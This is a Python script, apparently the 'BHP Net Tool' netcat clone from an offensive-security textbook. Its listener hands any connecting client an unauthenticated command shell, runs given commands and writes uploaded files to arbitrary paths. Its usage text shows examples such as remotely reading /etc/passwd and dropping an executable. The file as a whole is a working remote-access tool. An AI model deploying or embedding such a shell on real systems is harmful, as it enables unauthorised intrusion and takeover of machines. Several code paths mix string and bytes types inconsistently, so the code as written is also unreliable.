#!/bin/python3
import sys
import socket
import getopt
import threading
import subprocess


# Global Variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def run_command(command):
    # Trim New Line
    command = command.rstrip()

    # Running the Command
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to Execute Command. \r\n"

    # Returning the Output
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command


    # Check for upload
    if len(upload_destination):
        # Read all bytes and write to destination
        file_buffer = ""

        # Reading Data till none
        while True:
            data = client_socket.recv(4096)

            if not data:
                break
            else:
                file_buffer += data

        # Take Bytes and try to write them
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer.encode('utf-8'))
            file_descriptor.close()

            # Acknowledge that we wrotoe the file
            client_socket.send( "Successfully saved file to %s\r\n" % upload_destination)

        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    
    # Check for Command Execution
    if len(execute):
        # Run the Command
        output = run_command(execute)

        client_socket.send(output)


    # Check for Command Shell
    if command:
        while True:
            # Simple Prompt
            client_socket.send("<BHP:#> ".encode('utf-8'))

            cmd_buffer = b""
            
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # Send back command output
            response = run_command(cmd_buffer)

            # Send back the response
            client_socket.send(response)


def server_loop():
    global target
    global port

    # If No Target is specified, we listen to all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # Thread to handle new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket, ))
        client_thread.start()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to Target Host
        client.connect((target, port))

        if len(buffer):
            client.send(buffer.encode('utf-8'))

        while True:
            # Wait for Incoming Data
            recv_len = 1
            response = b""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(response.decode('utf-8'), end=' ')

            # Wait for Incoming Data
            buffer = input("")
            buffer += "\n"

            # Send Data
            client.send(buffer.encode('utf-8'))
    except:
        print("[*] Exception! Exiting...")

        # Closing Connection
        client.close()


def usage():
    print("BHP Net Tool\n")

    print("Usage: netcat.py -t target_host -p port")

    print("-l --listen\t\t - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run\t -execute the given file upon receiving a connection")
    print("-c --command\t\t - initialize a command shell")
    print("-u --upload=destination\t- upon receiving connection upload a file and write to [destination]\n\n")

    print("Examples:")
    print("netcat.py -t 192.168.0.1 -p 5555 -l -c")
    print("netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("netcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./netcat.py -t 192.168.11.12 -p 135")

    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    
    # Read the command line options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
    
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"


    if not listen and len(target) and port > 0:
        # Read Buffer from Command Line
        buffer = sys.stdin.read()

        # Send Data Off
        client_sender(buffer)

    if listen:
        server_loop()


main()
